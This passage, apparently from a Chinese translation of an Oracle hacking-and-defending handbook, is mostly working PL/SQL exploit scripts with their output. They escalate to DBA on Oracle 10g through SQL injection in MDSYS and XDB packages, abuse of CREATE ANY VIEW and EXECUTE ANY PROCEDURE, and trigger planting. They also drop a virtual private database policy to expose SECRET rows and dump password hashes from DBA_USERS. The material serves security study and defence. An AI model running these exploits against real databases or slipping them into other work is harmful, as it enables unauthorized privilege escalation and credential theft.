<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">          &#x27;begin &#x27; ||</span><br><span class="line">            &#x27;mdsys.rdf_apis_internal.&#x27; ||</span><br><span class="line">            &#x27;notify_drop_user(&#x27;&#x27;&#x27; || dictionary_obj_name || &#x27;&#x27;&#x27;); &#x27; ||</span><br><span class="line">          &#x27;end;&#x27;;</span><br></pre></td></tr></table></figure>

<p>这里，dictionary_obj_name 是被删除的用户。 可以在此处注入任意 PL/SQL，如下例所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&quot;;</span><br><span class="line">AA</span><br><span class="line">drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27;</span><br><span class="line">          *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-01918: user &#x27;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27; does not exist</span><br></pre></td></tr></table></figure>

<p>注意第六行的 AA。 这是将 DBMS_OUTPUT.PUT_LINE(‘AA’ 注入到 DROP USER 语句中的输出。现在让我们继续并从这里获取 DBA 权限，如前所述。我们将注入一个在 SYSTEM.OL$ 表上创建触发器的过程 , PUBLIC 具有 INSERT 的权限。创建后，您插入到 OL$ 表中，触发触发器并获得 DBA 权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line"></span><br><span class="line">-- this procedure will grant scott dba privs</span><br><span class="line">-- it will be executed from the trigger we&#x27;re</span><br><span class="line">-- about to create in the SYSTEM schema</span><br><span class="line">-- on the OL$ table</span><br><span class="line"></span><br><span class="line">create or replace procedure z authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE &#x27;GRANT DBA TO SCOTT&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on Z to public;</span><br><span class="line"></span><br><span class="line">-- This is the function that creates the trigger</span><br><span class="line">-- This will be called from the procedure we inject</span><br><span class="line"></span><br><span class="line">create or replace function tcf return varchar2 authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">STMT VARCHAR2(400):= &#x27;create or replace trigger&#x27;</span><br><span class="line">||&#x27; system.the_trigger &#x27;</span><br><span class="line">||&#x27; before insert on &#x27;</span><br><span class="line">||&#x27; system.OL$ &#x27;</span><br><span class="line">||&#x27; DECLARE msg VARCHAR2(30); BEGIN SCOTT.Z;</span><br><span class="line">dbms_output.put_line(&quot;aa&quot;);</span><br><span class="line">end the_trigger;&#x27;;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE STMT;</span><br><span class="line">COMMIT;</span><br><span class="line">RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on tcf to public;</span><br><span class="line"></span><br><span class="line">-- this is the procedure we inject into the drop user statement</span><br><span class="line"></span><br><span class="line">create or replace procedure g(v varchar2) authid current_user is</span><br><span class="line">BEGIN</span><br><span class="line">dbms_output.put_line(scott.tcf);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on g to public;</span><br><span class="line"></span><br><span class="line">-- now we launch it all</span><br><span class="line"></span><br><span class="line">drop user &quot;&#x27;);scott.g(&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">-- The trigger should be created now</span><br><span class="line">-- Time to fire it and get dba privs</span><br><span class="line"></span><br><span class="line">insert into system.OL$ (OL_NAME) VALUES (&#x27;OWNED!&#x27;);</span><br><span class="line"></span><br><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line">SELECT USERNAME,PASSWORD FROM DBA_USERS;</span><br><span class="line">DROP TRIGGER SYSTEM.THE_TRIGGER;</span><br></pre></td></tr></table></figure>

<h3 id="从CREATE-ANY-VIEW获取DBA"><a href="#从CREATE-ANY-VIEW获取DBA" class="headerlink" title="从CREATE ANY VIEW获取DBA"></a>从CREATE ANY VIEW获取DBA</h3><p>您可以以类似的方式利用 CREATE ANY VIEW。 默认情况下，在 10g 第 2 版中，授予此权限的唯一用户是 SYS； 如果您可以将 SQL 注入 SYS 过程，那么您无论如何都已经是 DBA。 出于说明目的，让我们假设一个具有此权限的测试用户并创建一个易受攻击的过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create user vtest identified by vtest;</span><br><span class="line">grant create session to vtest;</span><br><span class="line">grant create any view to vtest;</span><br><span class="line">grant create procedure to vtest;</span><br><span class="line"></span><br><span class="line">-- now connect as vtest</span><br><span class="line">connect vtest/vtest</span><br><span class="line">set serveroutput on</span><br><span class="line">-- create a vulnerable procedure</span><br><span class="line">create or replace procedure vproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || vt;</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on vproc to public;</span><br><span class="line">-- test it</span><br><span class="line">exec vproc(&#x27;ALL_OBJECTS&#x27;);</span><br></pre></td></tr></table></figure>

<p>有了我们的易受攻击的程序和具有 CREATE ANY VIEW 权限的测试用户，让我们开始利用它来获得 DBA 权限。</p>
<p>我们需要在 DBA 的模式中创建视图，然后以某种方式让高权限用户访问该视图。 第二部分可能听起来很难，但实际上并非如此。 SYS 拥有的数百个过程实例将视图或表的名称作为参数，然后它进行访问。 出于演示目的，让我们节省时间并快速创建我们自己的 - 通过使用 DBMS_ASSERT.QUALIFIED_SQL_NAME 函数确保它不会受到 SQL 注入的影响：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">connect / as sysdba</span><br><span class="line">create or replace procedure sproc (vt varchar2) is</span><br><span class="line">stmt varchar2(200);</span><br><span class="line">num number;</span><br><span class="line">begin</span><br><span class="line">stmt:=&#x27;select count(*) from &#x27; || dbms_assert.qualified_sql_name(vt);</span><br><span class="line">execute immediate stmt into num;</span><br><span class="line">dbms_output.put_line(num);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on sproc to public;</span><br></pre></td></tr></table></figure>

<p>好的，现在来获得 DBA 权限。 我们要做的是将我们自己的过程注入到 VTEST.VPROC 过程中，该过程在 SYSTEM 模式中创建一个视图。 我们在这里选择 SYSTEM 模式是因为 CREATE ANY VIEW 权限不允许我们在 SYS 模式中创建视图。 我们创建的视图将调用我们拥有的函数，并将我们的最终代码放在此处以获取 DBA 权限。 当我们通过 SYS.SPROC 过程访问视图时，将执行此函数，授予我们 DBA 权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line"></span><br><span class="line">-- create the function that will be called from the view</span><br><span class="line">-- and grants us DBA privileges</span><br><span class="line"></span><br><span class="line">create or replace function get_dba return number authid current_user is</span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;grant dba to scott&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on get_dba to public;</span><br><span class="line"></span><br><span class="line">-- create the function that we&#x27;ll inject into VTEST.VPROC</span><br><span class="line">-- and creates a view in the SYSTEM schema which calls</span><br><span class="line">-- our get_dba function</span><br><span class="line"></span><br><span class="line">create or replace function create_the_view return number authid</span><br><span class="line">current_user is</span><br><span class="line"></span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;create or replace view system.the_sysview (val) as</span><br><span class="line">select 1 from dual where scott.get_dba()=1&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on create_the_view to public;</span><br><span class="line"></span><br><span class="line">-- now inject the create_the_view function into VTEST.VPROC</span><br><span class="line"></span><br><span class="line">exec vtest.vproc(&#x27;ALL_OBJECTS where scott.create_the_view() = 1--&#x27;);</span><br><span class="line"></span><br><span class="line">-- The view should now be created</span><br><span class="line">-- All that&#x27;s left to do is get our dba privs</span><br><span class="line"></span><br><span class="line">exec sys.sproc(&#x27;SYSTEM.THE_SYSVIEW&#x27;);</span><br><span class="line"></span><br><span class="line">-- now claim our newly issued privileges</span><br><span class="line">set role dba</span><br><span class="line">-- and use them</span><br><span class="line">select username, password from sys.dba_users;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/9.png"></p>
<h3 id="从EXECUTE-ANY-PROCEDURE获取DBA"><a href="#从EXECUTE-ANY-PROCEDURE获取DBA" class="headerlink" title="从EXECUTE ANY PROCEDURE获取DBA"></a>从EXECUTE ANY PROCEDURE获取DBA</h3><p>我几乎不需要解释这一点。 毋庸置疑，当拥有此权限的用户可以找到 SYS 拥有的执行任意 SQL 的过程时，他们可以立即获得 DBA。 有很多这样的程序，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXEC SYS.LTADM.EXECSQL(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.LTADM.EXECSQLAUTO(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_PRVTAQIM.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_RPC.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYS.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_ADM_UTL.EXECUTE_SQL_STRING(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC INITJVMAUX.EXEC(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_REPACT_SQL_UTL.DO_SQL(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYSCALLS.KWQA_3GL_EXECUTESTMT(&#x27;begin null; end;&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="从CREATE-PROCEDURE获取DBA"><a href="#从CREATE-PROCEDURE获取DBA" class="headerlink" title="从CREATE PROCEDURE获取DBA"></a>从CREATE PROCEDURE获取DBA</h3><p>好的 - 这就是问题所在。 我们在一个只有很少权限的用户拥有的包中发现了一个 SQL 注入缺陷。 OLAPSYS、MDSYS、DBSNMP 和 ORDSYS 等帐户被授予创建过程权限。 因此，如果他们更改了其他人拥有的另一个过程所依赖的一个过程，那么他们就可以开始以该其他用户的身份执行代码。 如果该用户不是 DBA，那么您至少更近了一步。 例如，SYS 拥有的 VALIDATE_CONTEXT 过程依赖于 CTXSYS 拥有的 DRUE 包。 如果 CTXSYS 更改此包并将漏洞利用代码放入其中，则 CTXSYS 可以获得 DBA 权限。 因此，如果 CTXSYS 拥有一个容易受到 SQL 注入攻击的 PUBLIC 可执行过程，那么就有可能获得 DBA 特权。 碰巧的是，在 10g 第 2 版 CTXSYS 上没有此特权，但您明白了。 要查看哪个过程取决于什么，请检查 DBA_DEPENDENCIES 视图。</p>
<h2 id="攻击虚拟专用数据库"><a href="#攻击虚拟专用数据库" class="headerlink" title="攻击虚拟专用数据库"></a>攻击虚拟专用数据库</h2><p>本章假设您了解虚拟专用数据库 (VPD)。 如果您不了解，我推荐 David Knox 的 Effective Oracle Database 10g Security by Design（McGraw-Hill，2004 年）。 简而言之，VPD 是 Oracle 内置的一种安全机制，它允许细粒度的访问控制。 它用于强制执行安全策略。 本质上，VPD 只允许用户访问策略指定他们可以访问的数据，而不能访问更多数据。 但是，有多种方法可以攻击 VPD。 本章看几个。</p>
<h3 id="欺骗-Oracle-删除策略"><a href="#欺骗-Oracle-删除策略" class="headerlink" title="欺骗 Oracle 删除策略"></a>欺骗 Oracle 删除策略</h3><p>VPD 是使用 DBMS_RLS 包创建的。 也可以使用 DBMS_FGA 包——它们的作用完全相同。 顺便提一下，RLS 代表行级安全，而 FGA 代表细粒度访问。 如果我们想看看谁可以执行这个包，我们得到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_RLS&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br><span class="line"></span><br><span class="line">XDB                        EXECUTE</span><br><span class="line">WKSYS                        EXECUTE</span><br><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_FGA&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br></pre></td></tr></table></figure>

<p>综上所述，如果我们可以将代码作为 XDB 或 WKSYS 执行，那么我们就可以操纵 RLS 策略。 在开始之前，让我们设置一个简单的 VPD。 首先，创建将拥有 VPD 的用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT / AS SYSDBA</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE USER VPD IDENTIFIED BY PASS123;</span><br><span class="line"></span><br><span class="line">User created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE SESSION TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE TABLE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE PROCEDURE TO VPD;</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT UNLIMITED TABLESPACE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON DBMS_RLS TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br></pre></td></tr></table></figure>

<p>完成后，我们可以设置一个表用作 VPD。 在这个例子中，我们将创建一个存储army订单的表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE TABLE VPDTESTTABLE (CLASSIFICATION VARCHAR2(20),</span><br><span class="line">  2 ORDER_TEXT VARCHAR(20), RANK VARCHAR2(20));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT SELECT ON VPDTESTTABLE TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK) VALUES</span><br><span class="line">(&#x27;SECRET&#x27;,&#x27;CAPTURE ENEMY BASE&#x27;,&#x27;GENERAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;UPDATE DUTY ROTA&#x27;,&#x27;CORPORAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;SECRET&#x27;,&#x27;INVADE ON TUESDAY&#x27;,&#x27;COLONEL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;POLISH BOOTS&#x27;,&#x27;MAJOR&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure>

<p>在设置 VPD 之前，因为我们已授予 PUBLIC 执行权限，任何人都可以访问标记为 SECRET 的订单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- ---------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure>

<p>我们将设置一个虚拟专用数据库来防止这种情况。 首先，我们创建一个返回谓词的函数——本质上是一个 where 子句，它被附加到对表的查询的末尾：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION HIDE_SECRET_ORDERS(p_schema IN</span><br><span class="line">VARCHAR2,p_object IN VARCHAR2)</span><br><span class="line">  2  RETURN VARCHAR2</span><br><span class="line">  3  AS</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  RETURN &#x27;CLASSIFICATION !=&#x27;&#x27;SECRET&#x27;&#x27;&#x27;;</span><br><span class="line">  6  END;</span><br><span class="line"></span><br><span class="line">  7  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br></pre></td></tr></table></figure>

<p>创建函数后，现在可以使用它来执行策略 - 我们将其称为 SECRECY：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; BEGIN</span><br><span class="line">  2  DBMS_RLS.add_policy</span><br><span class="line">  3  (object_schema    =&gt; &#x27;VPD&#x27;,</span><br><span class="line">  4  object_name      =&gt; &#x27;VPDTESTTABLE&#x27;,</span><br><span class="line">  5  policy_name      =&gt; &#x27;SECRECY&#x27;,</span><br><span class="line">  6  policy_function  =&gt; &#x27;HIDE_SECRET_ORDERS&#x27;);</span><br><span class="line">  7  END;</span><br><span class="line">  8  /</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br></pre></td></tr></table></figure>

<p>现在，如果我们以 SCOTT 的身份重新连接并从此表中选择，我们将只会看到non-secret 订单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure>

<p>是时候再次访问了……</p>
<p>早些时候有人指出 XDB 可以执行 DBMS_RLS 包。 从理论上讲，如果我们能在 XDB 拥有的任何包中发现缺陷，我们就可以利用它来删除策略。 在寻找这样一个缺陷以将理论变为实际之后，我们在 DB_PITRIG_PKG 包中遇到了一个 - SQL 注入缺陷：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION F RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">  2  PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line"></span><br><span class="line">  3  BEGIN</span><br><span class="line">  4  DBMS_OUTPUT.PUT_LINE(&#x27;HELLO&#x27;);</span><br><span class="line">  5  EXECUTE IMMEDIATE &#x27;BEGIN</span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;&#x27;VPD&#x27;&#x27;,&#x27;&#x27;VPDTESTTABLE&#x27;&#x27;,&#x27;&#x27;SECRECY&#x27;&#x27;); END;&#x27;;</span><br><span class="line">  6  RETURN 1;</span><br><span class="line">  7  COMMIT;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE FOO (X NUMBER);</span><br><span class="line"></span><br><span class="line">SQL&gt; EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP(&#x27;SCOTT&quot;.&quot; FOO&quot; WHERE</span><br><span class="line">1=SCOTT.F()--&#x27;,&#x27;BBBB&#x27;);</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span 